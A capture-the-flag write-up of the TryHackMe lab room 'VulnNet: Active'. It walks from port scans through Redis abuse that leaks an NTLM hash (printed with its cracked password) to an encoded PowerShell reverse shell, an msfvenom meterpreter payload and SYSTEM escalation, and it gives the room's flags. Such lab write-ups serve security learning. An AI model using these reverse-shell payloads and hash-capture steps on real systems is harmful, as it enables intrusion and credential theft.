---
title: "VulnNet: Active"
date: 2025-2-28
draft: false
description: TryHackMe's Medium Room 
Tags:
- TryHackMe
- Windows
- Medium
---

## Enumeration

```
 nmap -sVC 10.10.179.38            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-28 15:05 +0545
Nmap scan report for 10.10.179.38 (10.10.179.38)
Host is up (0.22s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-28T09:21:16
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.64 seconds

```

```
rustscan -a 10.10.179.38            
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/k21/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.179.38:139
Open 10.10.179.38:53
Open 10.10.179.38:135
Open 10.10.179.38:464
Open 10.10.179.38:445
Open 10.10.179.38:6379
Open 10.10.179.38:9389
Open 10.10.179.38:49665
Open 10.10.179.38:49668
Open 10.10.179.38:49669
Open 10.10.179.38:49670
Open 10.10.179.38:49709
Open 10.10.179.38:49689
Open 10.10.179.38:49732
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-28 15:08 +0545
Initiating Ping Scan at 15:08
Scanning 10.10.179.38 [4 ports]
Completed Ping Scan at 15:08, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:08
Completed Parallel DNS resolution of 1 host. at 15:08, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 1, NX: 0, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 15:08
Scanning 10.10.179.38 (10.10.179.38) [14 ports]
Discovered open port 49689/tcp on 10.10.179.38
Discovered open port 135/tcp on 10.10.179.38
Discovered open port 464/tcp on 10.10.179.38
Discovered open port 445/tcp on 10.10.179.38
Discovered open port 49670/tcp on 10.10.179.38
Discovered open port 139/tcp on 10.10.179.38
Discovered open port 49669/tcp on 10.10.179.38
Discovered open port 6379/tcp on 10.10.179.38
Discovered open port 49732/tcp on 10.10.179.38
Discovered open port 53/tcp on 10.10.179.38
Discovered open port 49709/tcp on 10.10.179.38
Discovered open port 49665/tcp on 10.10.179.38
Discovered open port 9389/tcp on 10.10.179.38
Discovered open port 49668/tcp on 10.10.179.38
Completed SYN Stealth Scan at 15:08, 0.45s elapsed (14 total ports)
Nmap scan report for 10.10.179.38 (10.10.179.38)
Host is up, received echo-reply ttl 124 (0.22s latency).
Scanned at 2025-02-28 15:08:24 +0545 for 0s

PORT      STATE SERVICE      REASON
53/tcp    open  domain       syn-ack ttl 124
135/tcp   open  msrpc        syn-ack ttl 124
139/tcp   open  netbios-ssn  syn-ack ttl 124
445/tcp   open  microsoft-ds syn-ack ttl 124
464/tcp   open  kpasswd5     syn-ack ttl 124
6379/tcp  open  redis        syn-ack ttl 124
9389/tcp  open  adws         syn-ack ttl 124
49665/tcp open  unknown      syn-ack ttl 124
49668/tcp open  unknown      syn-ack ttl 124
49669/tcp open  unknown      syn-ack ttl 124
49670/tcp open  unknown      syn-ack ttl 124
49689/tcp open  unknown      syn-ack ttl 124
49709/tcp open  unknown      syn-ack ttl 124
49732/tcp open  unknown      syn-ack ttl 124

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.80 seconds
           Raw packets sent: 18 (768B) | Rcvd: 15 (644B)


```


Hmm interesting port `6379`.
After some research,we can do this.

![](Pasted%20image%2020250228150719.png)

So after searching sometime,
We can get RCE with web server but we don't have any web server.
![](Pasted%20image%2020250228151531.png)

And we can see this.
![](Pasted%20image%2020250228152035.png)

here:[[https://exploit-notes.hdks.org/exploit/database/redis-pentesting/]]

Lets try to do so.
```
mkdir share
sudo impacket-smbserver share ./share/ -smb2support


> eval "dofile('//10.0.0.1/share')" 0

```

![](Pasted%20image%2020250228152349.png)
![](Pasted%20image%2020250228152402.png)

Hmm I guess we got the hash.
![](Pasted%20image%2020250228152727.png)

Hmmm we got the pass.
```
ENTERPRISE-SECURITY::VULNNET:aaaaaaaaaaaaaaaa:925f22a45c276b225b376a93b8d5899b:010100000000000000805879c489db012bb8723ebcf5901f00000000010010007a006d0046006b0055004d007a004300030010007a006d0046006b0055004d007a0043000200100051006b00510059007a004f00510079000400100051006b00510059007a004f00510079000700080000805879c489db0106000400020000000800300030000000000000000000000000300000e69aa6432132022e1475f64b7f9e1297f96b1dba29bbd140ad75572d0fbfc3c00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310037002e00310031002e0033000000000000000000:sand_0873959498
```

Hmm so now we can do this.
![](Pasted%20image%2020250228152935.png)

Lets do further enumeration.
And we can do on this share.
![](Pasted%20image%2020250228153033.png)
And nothing interesting.
![](Pasted%20image%2020250228153205.png)

Lets see that .ps1 file.
![](Pasted%20image%2020250228153546.png)

Hmm so we can put file.
![](Pasted%20image%2020250228153518.png)

Hmm is it executing in sometime,
if yes,then we might get a shell.

Lets try to put a rev shell and try to get shell.

Make a same named .ps1 file.
```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQA3AC4AMQAxAC4AMwAiACwAOQA5ADkAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

```

And put that file into smb share which will overwrite and might executing in background in specific time that might give us shell.
And it worked.
![](Pasted%20image%2020250228160722.png)
![](Pasted%20image%2020250228160742.png)
![](Pasted%20image%2020250228160820.png)

Lets enumerate further.
And we can get user.txt.
![](Pasted%20image%2020250228164414.png)
`THM{3eb176aee96432d5b100bc93580b291e}`


Now lets try to became administrator.
Thats why we got shell.
![](Pasted%20image%2020250228171417.png)

Lets enumerate further.
So we can see there are enabled.
![](Pasted%20image%2020250228172459.png)

We might find something.
Lets do some research.

so after doing some talk with GPT and googling around we can use.
**JuicyPotato, PrintSpoofer, or RoguePotato** (depending on the OS version).

Hmm i have done one room before where i need to use PrintSpoofer.
Lets try to do so.

Lets go here and download.
[[https://github.com/itm4n/PrintSpoofer/releases]]

And try to transfer it to the vulnerable machine.
We can again use smb to transfer.
![](Pasted%20image%2020250228173521.png)
![](Pasted%20image%2020250228173542.png)

Lets try executing it.
But ... it didnt worked.
![](Pasted%20image%2020250228173703.png)

Hmmm.
this also didn't worked.
![](Pasted%20image%2020250228174041.png)

After trying different thing, We took help and we have to do it from meterpreter or by using `BloodHound`.
I am not so familiar with BloodHound,so i will use meterpreter.

Lets create a rev.exe to get a shell in meterpeter.
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=9000 -f exe -o rev.exe`

After creating we will transfer it from smb.
Then we need to setup a listenner.
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST ip
set LPORT 9000
exploit

```

and run this in vunerable machine.
`.\rev.exe`

And we got it.
![](Pasted%20image%2020250228180013.png)

Now what we need to do is to run this command on meterpreter.
`getsystem`.
![](Pasted%20image%2020250228182902.png)

### what does it do?
- **Attempts privilege escalation**: It tries various methods to obtain SYSTEM-level privileges.
- **Uses available exploits**: It may use techniques like **Token Impersonation**, **Service/Task Escalation**, or **Known Windows Exploits** to gain SYSTEM access.

And done.
We can get flag.
![](Pasted%20image%2020250228183222.png)

And done.
![](Pasted%20image%2020250228183253.png)

Many things learned again.
